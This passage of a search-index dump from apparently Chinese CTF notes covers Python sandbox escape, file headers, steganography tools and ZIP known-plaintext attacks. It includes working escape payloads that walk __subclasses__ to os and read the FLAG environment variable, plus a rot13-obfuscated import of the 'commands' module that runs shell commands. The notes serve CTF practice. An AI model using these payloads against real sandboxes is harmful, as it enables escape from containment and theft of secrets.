__builtin__ \u53d8\u6210\u4e86 builtins ,\u800c\u4e14\u9700\u8981\u5f15\u5165) \u56e0\u6b64, open() , int() , chr() \u8fd9\u4e9b\u51fd\u6570,\u5c31\u76f8\u5f53\u4e8e 1 2 3 __builtin__.open() __builtin__.int() __builtin__.chr() \u5982\u679c\u6211\u4eec\u628a\u8fd9\u4e9b\u51fd\u6570\u4ece __builtin__ \u4e2d\u5220\u9664,\u90a3\u4e48\u5c31\u4e0d\u80fd\u591f\u518d\u76f4\u63a5\u4f7f\u7528\u4e86 1 2 3 4 5 6 7 8 9 In [ 11 ]: del __builtin__ . chr In [ 12 ]: chr ( 1 ) --------------------------------------------------------------------------- NameError Traceback ( most recent call last ) < ipython - input - 12 - 933e3642 dad9 > in < module > () ----> 1 chr ( 1 ) NameError : name 'chr' is not defined \u540c\u6837,\u521a\u624d\u7684 __import__ \u51fd\u6570,\u540c\u6837\u4e5f\u662f\u4e00\u4e2abuiltin\u51fd\u6570,\u540c\u6837,\u5e38\u7528\u7684\u5371\u9669\u51fd\u6570 eval , exec , execfile \u4e5f\u662f __builtin__ \u7684,\u56e0\u6b64\u53ea\u8981\u4ece __builtin__ \u4e2d\u5220\u9664\u8fd9\u4e9b\u4e1c\u897f,\u90a3\u4e48\u5c31\u4e0d\u80fd\u518d\u53bb\u4f7f\u7528\u4e86 \u7136\u800c __builtin__ \u662f\u4e00\u4e2a\u9ed8\u8ba4\u5f15\u5165\u7684module\u5bf9\u4e8e\u6a21\u5757,\u6709\u4e00\u4e2a\u51fd\u6570 reload \u7528\u4e8e\u91cd\u65b0\u4ece\u6587\u4ef6\u7cfb\u7edf\u4e2d\u7684\u4ee3\u7801\u6765\u8f7d\u5165\u6a21\u5757 \u56e0\u6b64\u6211\u4eec\u53ea\u9700\u8981 1 reload(__builtin__) \u5c31\u53ef\u4ee5\u91cd\u65b0\u5f97\u5230\u5b8c\u6574\u7684 __builtin__ \u6a21\u5757\u4e86 \u4f46\u662f, reload \u4e5f\u662f __builtin__ \u4e0b\u9762\u7684\u51fd\u6570,\u5982\u679c\u76f4\u63a5\u628a\u5b83\u5e72\u6389,\u5c31\u6ca1\u529e\u6cd5\u91cd\u65b0\u5f15\u5165\u4e86 1 2 3 4 5 6 7 8 9 In [ 14 ]: del __builtin__ . reload In [ 15 ]: reload ( __builtin__ ) --------------------------------------------------------------------------- NameError Traceback ( most recent call last ) < ipython - input - 15 - 4439 d7b91af5 > in < module > () ----> 1 reload ( __builtin__ ) NameError : name 'reload' is not defined \u5728python\u4e2d,\u6709\u4e00\u4e2a\u6a21\u5757\u53eb\u505aimp,\u662f\u6709\u5173\u5f15\u5165\u7684\u4e00\u4e2a\u6a21\u5757 \u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 1 2 import imp imp . reload ( __builtin__ ) import\u9ad8\u7ea7 \u00b6 \u524d\u9762\u7684\u4e00\u4e9b\u9632\u62a4\u548c\u653b\u51fb,\u90fd\u662f\u9488\u5bf9 \u5f15\u5165\u51fd\u6570\u8fdb\u884c\u7684\uff0c\u7136\u800c\uff0c\u5f7b\u5e95\u60f3\u60f3\u8fd9\u4e2a\u5173\u4e8eimport\u7684\u95ee\u9898\uff0c\u6211\u4eec\u80fd\u5f15\u5165\u8fdb\u6765\u4e00\u4e2a\u5305\uff0c\u8bf4\u660e\u8fd9\u4e2a\u5305\u5df2\u7ecf\u9884\u5148\u5728\u4e00\u4e2a\u4f4d\u7f6e\u4e86\uff0c\u6240\u4ee5\u6211\u4eec\u624d\u80fd\u5f15\u5165\u8fdb\u6765\uff0c\u5426\u5219\u5c31\u4f1a\u50cf\u6ca1\u6709\u5b89\u88c5\u8fd9\u4e2a\u5305\u7684\u65f6\u5019\uff0c\u62a5\u4e00\u4e2a\u672a\u627e\u5230\u7684\u9519\u8bef \u5982\u679c\u6211\u4eec\u4ece\u67d0\u4e2a\u5730\u65b9\u5f7b\u5e95\u628a\u8fd9\u4e2a\u5305\u5220\u9664\uff0c\u90a3\u5c31\u53ef\u4ee5\u7981\u6b62\u4e86\u5f15\u5165 \u90a3\u4e48\uff0c\u5305\u7684\u5185\u5bb9\u88ab\u5b58\u653e\u5728\u54ea\u91cc\u5462\uff1f \u6211\u4eec\u77e5\u9053\uff0c\u901a\u8fc7pip\u5b89\u88c5\u7684package\u90fd\u4f1a\u88ab\u653e\u5728\u4ee5\u4e0b\u51e0\u4e2a\u8def\u5f84\u4e4b\u4e00,\u4ee52.7\u4e3a\u4f8b 1 2 3 /usr/local/lib/python2.7/dist-packages /usr/local/lib/python2.7/site-packages ~/.local/lib/python2.7/site-packages \u4e00\u822c\u7cfb\u7edf\u76f8\u5173\u7684\u5305\u90fd\u5728sys\u4e0b,\u73af\u5883\u53d8\u91cf\u6216\u8005\u8bf4\u7cfb\u7edf\u8def\u5f84\u80af\u5b9a\u4e5f\u662f\u5728\u4e0b\u9762. \u6211\u4eec\u53ef\u4ee5\u770b\u5230sys\u4e0b\u9762\u6709\u4e00\u4e2alist\u53eb\u505apath,\u67e5\u770b\u91cc\u9762\u7684\u5185\u5bb9,\u679c\u7136\u662f\u9ed8\u8ba4\u8def\u5f84 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 In [ 4 ]: import sys In [ 5 ]: sys . path Out [ 5 ]: [ '' , 'E: \\\\ ProgramFiles \\\\ anaconda3 \\\\ envs \\\\ sqlmap \\\\ Scripts \\\\ ipython.exe' , 'e: \\\\ programfiles \\\\ anaconda3 \\\\ envs \\\\ sqlmap \\\\ python27.zip' , 'e: \\\\ programfiles \\\\ anaconda3 \\\\ envs \\\\ sqlmap \\\\ DLLs' , 'e: \\\\ programfiles \\\\ anaconda3 \\\\ envs \\\\ sqlmap \\\\ lib' , 'e: \\\\ programfiles \\\\ anaconda3 \\\\ envs \\\\ sqlmap \\\\ lib \\\\ plat-win' , 'e: \\\\ programfiles \\\\ anaconda3 \\\\ envs \\\\ sqlmap \\\\ lib \\\\ lib-tk' , 'e: \\\\ programfiles \\\\ anaconda3 \\\\ envs \\\\ sqlmap' , 'e: \\\\ programfiles \\\\ anaconda3 \\\\ envs \\\\ sqlmap \\\\ lib \\\\ site-packages' , 'e: \\\\ programfiles \\\\ anaconda3 \\\\ envs \\\\ sqlmap \\\\ lib \\\\ site-packages \\\\ IPython \\\\ extensions' , 'C: \\\\ Users \\\\ zz \\\\ .ipython' ] \u5e38\u7528\u7684payload \u00b6 1 2 3 4 5 6 7 ().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__'](\"os\").__dict__.environ['FLAG'] ().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__(\"os\").__dict__.environ['FLAG'] ## \u4f5c\u8005\u7ed9\u7684; <type 'dict_keys'> \u91cc\u672c\u8eab\u5c31\u6709 OS [].__class__.__base__.__subclasses__()[68].__init__.__globals__['os'].__dict__.environ['FLAG'] \u5168\u5c40\u53d8\u91cfcurrent_app \u00b6 url_for \u548c get_flashed_messages \u5f15\u7528\u4e86\u5168\u5c40\u53d8\u91cf current_app Tokyo2018wp","title":"python\u6c99\u76d2"},{"location":"MISC/python\u6c99\u76d2/#python","text":"","title":"python\u6c99\u76d2"},{"location":"MISC/python\u6c99\u76d2/#python_1","text":"\u4f7f\u7528os\u5305\u4e2d\u7684popen,system\u4e24\u4e2a\u51fd\u6570\u6765\u76f4\u63a5\u6267\u884cshell \u4f7f\u7528commands\u6a21\u5757\u4e2d\u7684\u65b9\u6cd5 \u4f7f\u7528subprocess \u4f7f\u7528\u5199\u6587\u4ef6\u5230\u6307\u5b9a\u4f4d\u7f6e,\u518d\u4f7f\u7528\u5176\u4ed6\u8f85\u52a9\u624b\u6bb5 \u603b\u4f53\u6765\u8bf4,\u6211\u4eec\u4f7f\u7528\u4ee5\u4e0b\u51e0\u4e2a\u51fd\u6570,\u5c31\u53ef\u4ee5\u76f4\u63a5\u6109\u5feb\u7684\u62ff\u5230shell\u5566! \u4e00\u4e2a\u5f88\u91cd\u8981\u7684\u59ff\u52bf\uff1a __class__ \u8fd4\u56de\u5bf9\u5e94\u7684\u7c7b __base__ \u8fd4\u56de\u5bf9\u5e94\u7684\u57fa\u7c7b __subclassess__ \u8fd4\u56de\u5bf9\u5e94\u7684\u5b50\u7c7b 1 2 In [ 6 ]: [] . __class__ . __base__ . __subclasses__ ()[ 0 ] Out [ 6 ]: itertools . dropwhile","title":"python\u6c99\u7bb1\u9003\u9038\u6982\u8ff0"},{"location":"MISC/python\u6c99\u76d2/#python_2","text":"\u540d\u79f0 \u4ecb\u7ecd __dict__ \u8fd9\u4e2a\u5c5e\u6027\u4e2d\u5b58\u653e\u7740\u7c7b\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u5bf9\u5e94\u7684\u952e\u503c\u5bf9,\u5b9e\u6d4bmodule\u4e5f\u6709\u8fd9\u4e2a\u5c5e\u6027 __class__ \u8fd4\u56de\u4e00\u4e2a\u5b9e\u4f8b\u5bf9\u5e94\u7684\u7c7b\u578b __base__ \u8fd4\u56de\u4e00\u4e2a\u7c7b\u6240\u7ee7\u627f\u7684\u57fa\u7c7b __subclasses__() \u8fd4\u56de\u8be5\u7c7b\u7684\u6240\u6709\u5b50\u7c7b __mro__ python\u652f\u6301\u591a\u91cd\u7ee7\u627f\uff0c\u5728\u89e3\u6790 __init__ \u65f6\uff0c\u5b9a\u4e49\u89e3\u6790\u987a\u5e8f\u7684\u662f\u5b50\u7c7b\u7684 __mro__ \u5c5e\u6027\uff08\u503c\u662f\u7c7b\u7684\u5143\u7ec4\uff09 __slots__ \u9650\u5236\u7c7b\u52a8\u6001\u6dfb\u52a0\u5c5e\u6027 __getattribute__() \u83b7\u53d6\u5c5e\u6027\u6216\u65b9\u6cd5\uff0c\u5bf9\u6a21\u5757\u548c\u7c7b\u90fd\u6709\u6548 __getitem__() \u4ee5\u7d22\u5f15\u53d6\u503c\u6216\u8005\u952e\u53d6\u503c __globals__ \u8fd4\u56de\u51fd\u6570\u6240\u5728\u6a21\u5757\u547d\u540d\u7a7a\u95f4\u4e2d\u7684\u6240\u6709\u53d8\u91cf","title":"python\u91cd\u8981\u7684\u9b54\u6cd5\u51fd\u6570\u548c\u5c5e\u6027"},{"location":"MISC/python\u6c99\u76d2/#import","text":"__import__ \u662f\u4e00\u4e2a\u51fd\u6570 1 2 3 4 5 In [ 4 ]: f3ck = __import__ ( \"pbzznaqf\" . decode ( 'rot_13' )) In [ 5 ]: print f3ck . getoutput ( 'ipconfig' ) '{' \ufffd\ufffd\ufffd\ufffd\ufffd\u06b2\ufffd\ufffd\ufffd\ufffd\u2cbf\ufffd\ufffd\ufffd\ue8ec\u04b2\ufffd\ufffd\ufffd\u01ff\ufffd\ufffd\ufffd\ufffd\u0435\u0133\ufffd\ufffd\ufffd \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u013c\ufffd\ufffd\ufffd \u4f7f\u7528 importlib 1 2 3 4 5 6 7 In [6]: import importlib In [7]: f3ck = importlib.import_module(\"pbzznaqf\".decode('rot_13')) In [8]: print f3ck.getoutput('ipconfig') '{' \ufffd\ufffd\ufffd\ufffd\ufffd\u06b2\ufffd\ufffd\ufffd\ufffd\u2cbf\ufffd\ufffd\ufffd\ue8ec\u04b2\ufffd\ufffd\ufffd\u01ff\ufffd\ufffd\ufffd\ufffd\u0435\u0133\ufffd\ufffd\ufffd \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u013c\ufffd\ufffd\ufffd","title":"\u5982\u4f55import"},{"location":"MISC/python\u6c99\u76d2/#import_1","text":"\u5728python\u4e2d,\u6211\u4eec\u77e5\u9053,\u4e0d\u7528\u5f15\u5165\u76f4\u63a5\u4f7f\u7528\u7684\u5185\u7f6e\u51fd\u6570\u79f0\u4e3a builtin \u51fd\u6570,\u968f\u7740 __builtin__ \u8fd9\u4e00\u4e2amodule \u81ea\u52a8\u88ab\u5f15\u5165\u5230\u73af\u5883\u4e2d (\u5728python3.x \u7248\u672c\u4e2d, __builtin__ \u53d8\u6210\u4e86 builtins ,\u800c\u4e14\u9700\u8981\u5f15\u5165) \u56e0\u6b64, open() , int() , chr() \u8fd9\u4e9b\u51fd\u6570,\u5c31\u76f8\u5f53\u4e8e 1 2 3 __builtin__.open() __builtin__.int() __builtin__.chr() \u5982\u679c\u6211\u4eec\u628a\u8fd9\u4e9b\u51fd\u6570\u4ece __builtin__ \u4e2d\u5220\u9664,\u90a3\u4e48\u5c31\u4e0d\u80fd\u591f\u518d\u76f4\u63a5\u4f7f\u7528\u4e86 1 2 3 4 5 6 7 8 9 In [ 11 ]: del __builtin__ . chr In [ 12 ]: chr ( 1 ) --------------------------------------------------------------------------- NameError Traceback ( most recent call last ) < ipython - input - 12 - 933e3642 dad9 > in < module > () ----> 1 chr ( 1 ) NameError : name 'chr' is not defined \u540c\u6837,\u521a\u624d\u7684 __import__ \u51fd\u6570,\u540c\u6837\u4e5f\u662f\u4e00\u4e2abuiltin\u51fd\u6570,\u540c\u6837,\u5e38\u7528\u7684\u5371\u9669\u51fd\u6570 eval , exec , execfile \u4e5f\u662f __builtin__ \u7684,\u56e0\u6b64\u53ea\u8981\u4ece __builtin__ \u4e2d\u5220\u9664\u8fd9\u4e9b\u4e1c\u897f,\u90a3\u4e48\u5c31\u4e0d\u80fd\u518d\u53bb\u4f7f\u7528\u4e86 \u7136\u800c __builtin__ \u662f\u4e00\u4e2a\u9ed8\u8ba4\u5f15\u5165\u7684module\u5bf9\u4e8e\u6a21\u5757,\u6709\u4e00\u4e2a\u51fd\u6570 reload \u7528\u4e8e\u91cd\u65b0\u4ece\u6587\u4ef6\u7cfb\u7edf\u4e2d\u7684\u4ee3\u7801\u6765\u8f7d\u5165\u6a21\u5757 \u56e0\u6b64\u6211\u4eec\u53ea\u9700\u8981 1 reload(__builtin__) \u5c31\u53ef\u4ee5\u91cd\u65b0\u5f97\u5230\u5b8c\u6574\u7684 __builtin__ \u6a21\u5757\u4e86 \u4f46\u662f, reload \u4e5f\u662f __builtin__ \u4e0b\u9762\u7684\u51fd\u6570,\u5982\u679c\u76f4\u63a5\u628a\u5b83\u5e72\u6389,\u5c31\u6ca1\u529e\u6cd5\u91cd\u65b0\u5f15\u5165\u4e86 1 2 3 4 5 6 7 8 9 In [ 14 ]: del __builtin__ . reload In [ 15 ]: reload ( __builtin__ ) --------------------------------------------------------------------------- NameError Traceback ( most recent call last ) < ipython - input - 15 - 4439 d7b91af5 > in < module > () ----> 1 reload ( __builtin__ ) NameError : name 'reload' is not defined \u5728python\u4e2d,\u6709\u4e00\u4e2a\u6a21\u5757\u53eb\u505aimp,\u662f\u6709\u5173\u5f15\u5165\u7684\u4e00\u4e2a\u6a21\u5757 \u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 1 2 import imp imp . reload ( __builtin__ )","title":"import \u8fdb\u9636"},{"location":"MISC/python\u6c99\u76d2/#import_2","text":"\u524d\u9762\u7684\u4e00\u4e9b\u9632\u62a4\u548c\u653b\u51fb,\u90fd\u662f\u9488\u5bf9 \u5f15\u5165\u51fd\u6570\u8fdb\u884c\u7684\uff0c\u7136\u800c\uff0c\u5f7b\u5e95\u60f3\u60f3\u8fd9\u4e2a\u5173\u4e8eimport\u7684\u95ee\u9898\uff0c\u6211\u4eec\u80fd\u5f15\u5165\u8fdb\u6765\u4e00\u4e2a\u5305\uff0c\u8bf4\u660e\u8fd9\u4e2a\u5305\u5df2\u7ecf\u9884\u5148\u5728\u4e00\u4e2a\u4f4d\u7f6e\u4e86\uff0c\u6240\u4ee5\u6211\u4eec\u624d\u80fd\u5f15\u5165\u8fdb\u6765\uff0c\u5426\u5219\u5c31\u4f1a\u50cf\u6ca1\u6709\u5b89\u88c5\u8fd9\u4e2a\u5305\u7684\u65f6\u5019\uff0c\u62a5\u4e00\u4e2a\u672a\u627e\u5230\u7684\u9519\u8bef \u5982\u679c\u6211\u4eec\u4ece\u67d0\u4e2a\u5730\u65b9\u5f7b\u5e95\u628a\u8fd9\u4e2a\u5305\u5220\u9664\uff0c\u90a3\u5c31\u53ef\u4ee5\u7981\u6b62\u4e86\u5f15\u5165 \u90a3\u4e48\uff0c\u5305\u7684\u5185\u5bb9\u88ab\u5b58\u653e\u5728\u54ea\u91cc\u5462\uff1f \u6211\u4eec\u77e5\u9053\uff0c\u901a\u8fc7pip\u5b89\u88c5\u7684package\u90fd\u4f1a\u88ab\u653e\u5728\u4ee5\u4e0b\u51e0\u4e2a\u8def\u5f84\u4e4b\u4e00,\u4ee52.7\u4e3a\u4f8b 1 2 3 /usr/local/lib/python2.7/dist-packages /usr/local/lib/python2.7/site-packages ~/.local/lib/python2.7/site-packages \u4e00\u822c\u7cfb\u7edf\u76f8\u5173\u7684\u5305\u90fd\u5728sys\u4e0b,\u73af\u5883\u53d8\u91cf\u6216\u8005\u8bf4\u7cfb\u7edf\u8def\u5f84\u80af\u5b9a\u4e5f\u662f\u5728\u4e0b\u9762. \u6211\u4eec\u53ef\u4ee5\u770b\u5230sys\u4e0b\u9762\u6709\u4e00\u4e2alist\u53eb\u505apath,\u67e5\u770b\u91cc\u9762\u7684\u5185\u5bb9,\u679c\u7136\u662f\u9ed8\u8ba4\u8def\u5f84 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 In [ 4 ]: import sys In [ 5 ]: sys . path Out [ 5 ]: [ '' , 'E: \\\\ ProgramFiles \\\\ anaconda3 \\\\ envs \\\\ sqlmap \\\\ Scripts \\\\ ipython.exe' , 'e: \\\\ programfiles \\\\ anaconda3 \\\\ envs \\\\ sqlmap \\\\ python27.zip' , 'e: \\\\ programfiles \\\\ anaconda3 \\\\ envs \\\\ sqlmap \\\\ DLLs' , 'e: \\\\ programfiles \\\\ anaconda3 \\\\ envs \\\\ sqlmap \\\\ lib' , 'e: \\\\ programfiles \\\\ anaconda3 \\\\ envs \\\\ sqlmap \\\\ lib \\\\ plat-win' , 'e: \\\\ programfiles \\\\ anaconda3 \\\\ envs \\\\ sqlmap \\\\ lib \\\\ lib-tk' , 'e: \\\\ programfiles \\\\ anaconda3 \\\\ envs \\\\ sqlmap' , 'e: \\\\ programfiles \\\\ anaconda3 \\\\ envs \\\\ sqlmap \\\\ lib \\\\ site-packages' , 'e: \\\\ programfiles \\\\ anaconda3 \\\\ envs \\\\ sqlmap \\\\ lib \\\\ site-packages \\\\ IPython \\\\ extensions' , 'C: \\\\ Users \\\\ zz \\\\ .ipython' ]","title":"import\u9ad8\u7ea7"},{"location":"MISC/python\u6c99\u76d2/#payload","text":"1 2 3 4 5 6 7 ().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__'](\"os\").__dict__.environ['FLAG'] ().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__(\"os\").__dict__.environ['FLAG'] ## \u4f5c\u8005\u7ed9\u7684; <type 'dict_keys'> \u91cc\u672c\u8eab\u5c31\u6709 OS [].__class__.__base__.__subclasses__()[68].__init__.__globals__['os'].__dict__.environ['FLAG']","title":"\u5e38\u7528\u7684payload"},{"location":"MISC/python\u6c99\u76d2/#current_app","text":"url_for \u548c get_flashed_messages \u5f15\u7528\u4e86\u5168\u5c40\u53d8\u91cf current_app Tokyo2018wp","title":"\u5168\u5c40\u53d8\u91cfcurrent_app"},{"location":"MISC/\u5229\u7528Opcode\u7ed5\u8fc7python\u6c99\u7bb1/","text":"\u5229\u7528OpCode\u7ed5\u8fc7Python\u6c99\u7bb1 \u00b6 \u770b\u5230\u8fd9\u7bc7\u6587\u7ae0\u89c9\u5f97\u8fd8\u633a\u68d2\u7684 \u4e4b\u540e\u518d\u5206\u6790\u4e00\u4e0b \u5229\u7528OpCode\u7ed5\u8fc7Python\u6c99\u7bb1","title":"\u5229\u7528OpCode\u7ed5\u8fc7Python\u6c99\u7bb1"},{"location":"MISC/\u5229\u7528Opcode\u7ed5\u8fc7python\u6c99\u7bb1/#opcodepython","text":"\u770b\u5230\u8fd9\u7bc7\u6587\u7ae0\u89c9\u5f97\u8fd8\u633a\u68d2\u7684 \u4e4b\u540e\u518d\u5206\u6790\u4e00\u4e0b \u5229\u7528OpCode\u7ed5\u8fc7Python\u6c99\u7bb1","title":"\u5229\u7528OpCode\u7ed5\u8fc7Python\u6c99\u7bb1"},{"location":"MISC/\u5e38\u7528\u5de5\u5177/","text":"\u5e38\u7528\u5de5\u5177 \u00b6 zsteg \u00b6 \u63d0\u53d6\u6587\u4ef6\uff0c zsteg xxxx -E b1,rgb,lsb,xy > out \u901a\u8fc7 --all \u9009\u9879\u89c2\u5bdf\u51fa\u6240\u6709\u7684\u53ef\u80fd\uff0c\u7136\u540e\u786e\u5b9a\u5176\u4e2d\u7684\u4fe1\u606f\u5c31\u53ef\u4ee5\u63d0\u53d6\u51fa\u6765\u4e86 wirehsark \u00b6 \u539f\u6765wireshark\u4e2d\u4e0d\u540c\u7684\u989c\u8272\u4ee3\u8868\u8fd9\u4e9b\u542b\u4e49","title":"\u5e38\u7528\u5de5\u5177"},{"location":"MISC/\u5e38\u7528\u5de5\u5177/#_1","text":"","title":"\u5e38\u7528\u5de5\u5177"},{"location":"MISC/\u5e38\u7528\u5de5\u5177/#zsteg","text":"\u63d0\u53d6\u6587\u4ef6\uff0c zsteg xxxx -E b1,rgb,lsb,xy > out \u901a\u8fc7 --all \u9009\u9879\u89c2\u5bdf\u51fa\u6240\u6709\u7684\u53ef\u80fd\uff0c\u7136\u540e\u786e\u5b9a\u5176\u4e2d\u7684\u4fe1\u606f\u5c31\u53ef\u4ee5\u63d0\u53d6\u51fa\u6765\u4e86","title":"zsteg"},{"location":"MISC/\u5e38\u7528\u5de5\u5177/#wirehsark","text":"\u539f\u6765wireshark\u4e2d\u4e0d\u540c\u7684\u989c\u8272\u4ee3\u8868\u8fd9\u4e9b\u542b\u4e49","title":"wirehsark"},{"location":"MISC/\u5e38\u7528\u7684\u89e3\u5bc6\u7f51\u7ad9/","text":"\u89e3\u5bc6\u7f51\u7ad9 \u00b6 brain fuck \u00b6 bugkutool \u00b6 CTF \u5728\u7ebf\u5de5\u5177 \u00b6 \u5de5\u5177\u7bb1 \u00b6 pyc\u5728\u7ebf\u53cd\u7f16\u8bd1 base58 \u00b6 base85 \u00b6 unicode\u67e5\u8be2 \u00b6","title":"\u5e38\u7528\u7684\u89e3\u5bc6\u7f51\u7ad9"},{"location":"MISC/\u5e38\u7528\u7684\u89e3\u5bc6\u7f51\u7ad9/#_1","text":"","title":"\u89e3\u5bc6\u7f51\u7ad9"},{"location":"MISC/\u5e38\u7528\u7684\u89e3\u5bc6\u7f51\u7ad9/#brain-fuck","text":"","title":"brain fuck"},{"location":"MISC/\u5e38\u7528\u7684\u89e3\u5bc6\u7f51\u7ad9/#bugkutool","text":"","title":"bugkutool"},{"location":"MISC/\u5e38\u7528\u7684\u89e3\u5bc6\u7f51\u7ad9/#ctf","text":"","title":"CTF\u5728\u7ebf\u5de5\u5177"},{"location":"MISC/\u5e38\u7528\u7684\u89e3\u5bc6\u7f51\u7ad9/#_2","text":"pyc\u5728\u7ebf\u53cd\u7f16\u8bd1","title":"\u5de5\u5177\u7bb1"},{"location":"MISC/\u5e38\u7528\u7684\u89e3\u5bc6\u7f51\u7ad9/#base58","text":"","title":"base58"},{"location":"MISC/\u5e38\u7528\u7684\u89e3\u5bc6\u7f51\u7ad9/#base85","text":"","title":"base85"},{"location":"MISC/\u5e38\u7528\u7684\u89e3\u5bc6\u7f51\u7ad9/#unicode","text":"","title":"unicode\u67e5\u8be2"},{"location":"MISC/\u5e38\u89c1\u6587\u4ef6\u683c\u5f0f/","text":"\u5e38\u89c1\u6587\u4ef6\u683c\u5f0f \u00b6 PNG\u683c\u5f0f \u00b6 \u6587\u4ef6\u5934\u4e3a 89 50 4e 47 0d 0a 1a png\u683c\u5f0f\u662f\u7531\u4e0d\u540c\u7684\u6570\u636e\u5757\u7ec4\u6210\u7684 jpeg\u683c\u5f0f \u00b6 \u5c5e\u4e8e\u6709\u635f\u538b\u7f29\u7684\u4e0e\u5e73\u53f0\u65e0\u5173\u7684\u56fe\u50cf\u683c\u5f0f\uff0cjpeg\u7684\u538b\u7f29\u6bd4\u9ad8(\u53ef\u9ad8\u8fbe100\uff1a1),png\u4e3b\u8981\u662f\u5757\uff0c\u800cjpeg\u4e3b\u8981\u662f\u4ee5\u6bb5\u7684\u5f62\u5f0f bmp\u683c\u5f0f \u00b6 \u662fwindows\u7684\u6807\u51c6\u56fe\u50cf\u6587\u4ef6\u683c\u5f0f\uff0c\u901a\u5e38\u60c5\u51b5\u4e0b\u91c7\u7528\u4f4d\u6620\u5c04\u5b58\u50a8\u683c\u5f0f\uff0c\u9664\u4e86\u56fe\u50cf\u7684\u6df1\u5ea6(\u53ef\u4ee5\u7406\u89e3\u4e3a\u63a7\u5236\u8272\u5f69\u7684\u80fd\u529b)\u53ef\u9009\u5916\uff0c\u4e0d\u91c7\u7528\u4efb\u4f55\u5176\u4ed6\u7684\u538b\u7f29\u65b9\u5f0f\uff0c\u56e0\u6b64bmp\u7684\u56fe\u50cf\u8d28\u91cf\u975e\u5e38\u9ad8\uff0c\u4f53\u79ef\u4e5f\u975e\u5e38\u5927\uff0cbmp\u56fe\u50cf\u901a\u5e38\u53ef\u4ee5\u5206\u4e3a\u8bbe\u5907\u76f8\u5173\u4f4d\u56fe\u548c\u8bbe\u5907\u65e0\u5173\u4f4d\u56fe\u4e24\u5927\u7c7b\uff0c\u4e00\u4e2abmp\u7684\u6587\u4ef6\u683c\u5f0f\u901a\u5e38\u7531\u6587\u4ef6\u5934\uff0c\u4fe1\u606f\u5934\uff0c\u989c\u8272\u4fe1\u606f\u548c\u4f4d\u56fe\u6570\u636e\u56db\u90e8\u5206\u7ec4\u6210 \u6587\u4ef6\u5934:\u524d\u9762\u4e24\u4e2a\u5b57\u8282\u4e00\u822c 42 4D \uff0c\u968f\u540e4\u4e2a\u5b57\u8282\u8868\u793a\u4f4d\u56fe\u5927\u5c0f,\u518d\u540e\u97624\u4e2a\u5b57\u8282\u4e3a\u4fdd\u7559\u4f4d\u8bbe\u7f6e\u4e3a0,\u518d\u540e\u9762\u76844\u4e2a\u5b57\u8282\u975e\u5e38\u5173\u952e\uff0c\u8868\u793a\u6587\u4ef6\u5934\u5230\u4f4d\u56fe\u6570\u636e\u7684\u504f\u79fb\u91cf gif\u683c\u5f0f \u00b6 zip\u6587\u4ef6\u683c\u5f0f \u00b6 \u660e\u6587\u653b\u51fb\u539f\u7406 \u00b6 \u4e00\u4e2a\u52a0\u5bc6\u7684\u538b\u7f29\u6587\u4ef6 \u538b\u7f29\u6587\u4ef6\u7684\u538b\u7f29\u5de5\u5177\uff0c\u6bd4\u5982 2345 \u597d\u538b\uff0c WinRAR \uff0c 7z \u3002 zip \u7248\u672c\u53f7\u7b49\uff0c\u53ef\u4ee5\u901a\u8fc7\u6587\u4ef6\u5c5e\u6027\u4e86\u89e3\u3002\u5982\u679c\u662f Linux \u5e73\u53f0\uff0c\u7528 zipinfo -v \u53ef\u4ee5\u67e5\u770b\u4e00\u4e2a zip \u5305\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u5305\u62ec\u52a0\u5bc6\u7b97\u6cd5\u7b49 \u77e5\u9053\u538b\u7f29\u5305\u91cc\u67d0\u4e2a\u6587\u4ef6\u7684\u90e8\u5206\u8fde\u7eed\u5185\u5bb9 (\u81f3\u5c11 12 \u5b57\u8282) \u5982\u679c\u4f60\u5df2\u7ecf\u6709\u538b\u7f29\u5305\u4e2d\u89e3\u538b\u7684\u4e00\u4e2a\u6587\u4ef6\uff0c\u4e5f\u5c31\u662f\u77e5\u9053\u4e86\u538b\u7f29\u5427\u4e2d\u7684\u90e8\u5206\u5185\u5bb9\uff0c\u5c31\u53ef\u4ee5\u5c1d\u8bd5\u660e\u6587\u653b\u51fb \u9996\u5148\uff0c\u5c06\u8fd9\u4e2a\u660e\u6587\u6587\u4ef6\u6253\u5305\u6210 zip \u5305\uff0c\u6bd4\u5982\u5c06 readme.txt \u6253\u5305\u6210 readme.zip \u3002 \u6253\u5305\u5b8c\u6210\u540e\uff0c\u9700\u8981\u786e\u8ba4\u4e8c\u8005\u91c7\u7528\u7684\u538b\u7f29\u7b97\u6cd5\u76f8\u540c\u3002\u4e00\u4e2a\u7b80\u5355\u7684\u5224\u65ad\u65b9\u6cd5\u662f\u7528 WinRAR \u6253\u5f00\u6587\u4ef6\uff0c\u540c\u4e00\u4e2a\u6587\u4ef6\u538b\u7f29\u540e\u7684\u4f53\u79ef\u662f\u5426\u76f8\u540c\u3002\u5982\u679c\u76f8\u540c\uff0c\u57fa\u672c\u53ef\u4ee5\u8bf4\u660e\u4f60\u7528\u7684\u538b\u7f29\u7b97\u6cd5\u662f\u6b63\u786e\u7684\u3002\u5982\u679c\u4e0d\u540c\uff0c\u5c31\u5c1d\u8bd5\u53e6\u4e00\u79cd\u538b\u7f29\u7b97\u6cd5\u3002 \u5f88\u6709\u53ef\u80fd\u9047\u5230\u8fd9\u79cd\u60c5\u51b5 \u4f2a\u52a0\u5bc6\u7684\u7834\u89e3\u65b9\u5f0f \u00b6 ZipCenOp.jar \u611f\u89c9\u7528\u5904\u4e0d\u662f\u5f88\u5927 \u6587\u4ef6\u5934 \u00b6 JPEG (jpg)\uff0c\u6587\u4ef6\u5934\uff1aFFD8FFE0 PNG (png)\uff0c\u6587\u4ef6\u5934\uff1a89504E47 GIF (gif)\uff0c\u6587\u4ef6\u5934\uff1a474946383961 ZIP Archive (zip)\uff0c\u6587\u4ef6\u5934\uff1a504B0304 RAR Archive (rar)\uff0c\u6587\u4ef6\u5934\uff1a52617221 Wave 